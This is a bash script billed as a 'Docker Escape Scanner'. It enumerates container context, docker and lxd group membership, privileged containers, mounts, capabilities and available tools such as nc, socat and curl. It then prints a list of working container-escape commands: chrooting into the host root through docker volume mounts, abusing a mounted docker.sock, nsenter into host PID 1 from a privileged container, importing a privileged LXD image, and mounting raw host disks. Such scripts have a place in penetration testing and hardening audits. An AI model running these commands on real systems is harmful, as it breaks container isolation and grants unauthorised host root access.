#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║          DOCKER ESCAPE SCANNER           ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"

echo -e "\n${BLUE}[+] Checking if running in container${NC}"
if [ -f /.dockerenv ]; then
    echo -e "${RED}[!] Running in Docker container detected${NC}"
else
    echo -e "${YELLOW}[?] Not in Docker container (or not Docker-based)${NC}"
fi

echo -e "\n${BLUE}[+] Checking cgroup${NC}"
if grep -qi "docker\|lxc" /proc/1/cgroup; then
    echo -e "${RED}[!] Container detected in cgroup${NC}"
    cat /proc/1/cgroup
fi

echo -e "\n${BLUE}[+] Checking user groups${NC}"
user_groups=$(groups)
echo "$user_groups"

if echo "$user_groups" | grep -qi "docker"; then
    echo -e "${RED}[!] User is in docker group!${NC}"
    echo -e "${GREEN}    Can execute docker commands as root${NC}"
fi

if echo "$user_groups" | grep -qi "lxd\|lxc"; then
    echo -e "${RED}[!] User is in lxd/lxc group!${NC}"
    echo -e "${GREEN}    Container escape possible${NC}"
fi

echo -e "\n${BLUE}[+] Checking docker command availability${NC}"
if command -v docker &> /dev/null; then
    echo -e "${GREEN}[+] Docker command is available${NC}"
    docker_version=$(docker --version)
    echo -e "${YELLOW}Version: $docker_version${NC}"
    
    echo -e "\n${YELLOW}[+] Checking if user can run docker commands${NC}"
    if docker ps &> /dev/null; then
        echo -e "${RED}[!] User can run docker commands!${NC}"
        
        echo -e "\n${GREEN}[+] Listing Docker images${NC}"
        docker images
        
        echo -e "\n${GREEN}[+] Listing running containers${NC}"
        docker ps -a
    else
        echo -e "${YELLOW}[?] Docker command exists but cannot be executed by user${NC}"
    fi
else
    echo -e "${YELLOW}[?] Docker command not found${NC}"
fi

echo -e "\n${BLUE}[+] Checking for mounted host filesystems${NC}"
mount | grep -v "cgroup\|proc\|sysfs\|tmpfs\|devtmpfs\|overlay" | head -10

echo -e "\n${BLUE}[+] Checking for volume mounts${NC}"
if command -v docker &> /dev/null; then
    docker inspect $(docker ps -q) 2>/dev/null | grep -A 5 "Mounts" || echo -e "${YELLOW}[?] No running containers or no mounts${NC}"
fi

echo -e "\n${BLUE}[+] Checking for dangerous capabilities${NC}"
if command -v docker &> /dev/null; then
    docker inspect $(docker ps -q) 2>/dev/null | grep -i "CapAdd\|CapDrop\|Privileged" || echo -e "${YELLOW}[?] No capabilities info available${NC}"
fi

echo -e "\n${BLUE}[+] Checking for privileged containers${NC}"
if command -v docker &> /dev/null; then
    privileged_containers=$(docker inspect $(docker ps -q) 2>/dev/null | grep -c "Privileged.*true" || echo "0")
    if [ "$privileged_containers" -gt 0 ]; then
        echo -e "${RED}[!] Privileged container detected${NC}"
        echo -e "${GREEN}    Full host access available${NC}"
    else
        echo -e "${GREEN}[+] No privileged containers found${NC}"
    fi
fi

echo -e "\n${BLUE}[+] Checking for device passthrough${NC}"
if command -v docker &> /dev/null; then
    docker inspect $(docker ps -q) 2>/dev/null | grep -i "Devices" | head -5 || echo -e "${YELLOW}[?] No device passthrough${NC}"
fi

echo -e "\n${BLUE}[+] Checking LXD/LXC availability${NC}"
if command -v lxc &> /dev/null || command -v lxd &> /dev/null; then
    echo -e "${GREEN}[+] LXD/LXC is available${NC}"
    
    if command -v lxc &> /dev/null; then
        lxc list 2>/dev/null || echo -e "${YELLOW}[?] Cannot list LXC containers${NC}"
    fi
    
    if command -v lxd &> /dev/null; then
        lxc list 2>/dev/null || echo -e "${YELLOW}[?] Cannot list LXD containers${NC}"
    fi
fi

echo -e "\n${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║        DOCKER ESCAPE TECHNIQUES         ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"

cat << 'EOF'

1. DOCKER GROUP ESCAPE (if in docker group):
   # Mount host root
   docker run -v /:/mnt -it ubuntu chroot /mnt
   
   # Access host files
   docker run -v /root:/root -it ubuntu bash

2. PRIVILEGED CONTAINER ESCAPE:
   # Access devices directly
   fdisk -l
   
   # Mount host filesystem
   mkdir /mnt/host
   mount /dev/sda1 /mnt/host

3. DOCKER SOCKET ESCAPE:
   # If docker socket is mounted
   docker run -v /var/run/docker.sock:/var/run/docker.sock \
              -it ubuntu bash
   
   # Then use docker to spawn privileged container
   docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh

4. LXD ESCAPE (if in lxd group):
   # Build vulnerable image on your machine
   lxd init
   lxc image import vulnerable.tar.gz --alias vulnerable
   lxc launch vulnerable exploit -c security.privileged=true
   lxc exec exploit /bin/bash
   mount /dev/sda1 /mnt/root

5. CAPABILITIES ESCAPE:
   # If you have capabilities, you might be able to:
   # - Use mount capability to mount host filesystems
   # - Use device capabilities to access devices
   # - Use network capabilities for network attacks

6. VOLUME MOUNT EXPLOIT:
   # If host directories are mounted
   # Look for: /root, /home, /etc, /var
   # Check for: SSH keys, passwords, sensitive files

7. DOCKER DAEMON ESCAPE:
   # If can access docker daemon
   docker run -it --rm -v /:/hostfs alpine \
   chroot /hostfs

EOF

echo -e "\n${BLUE}[+] Checking for available Docker images for escape${NC}"
if command -v docker &> /dev/null; then
    docker images | head -5
fi

echo -e "\n${BLUE}[+] Checking for installed tools that might help${NC}"
tools=("socat" "netcat" "nc" "wget" "curl" "python" "python3" "perl" "ruby" "gcc")
for tool in "${tools[@]}"; do
    if command -v $tool &> /dev/null; then
        echo -e "${GREEN}[+] $tool is available${NC}"
    fi
done

echo -e "\n${GREEN}[+] Docker escape scan complete${NC}"
echo -e "${YELLOW}Remember: Always verify permissions before attempting any escape${NC}"
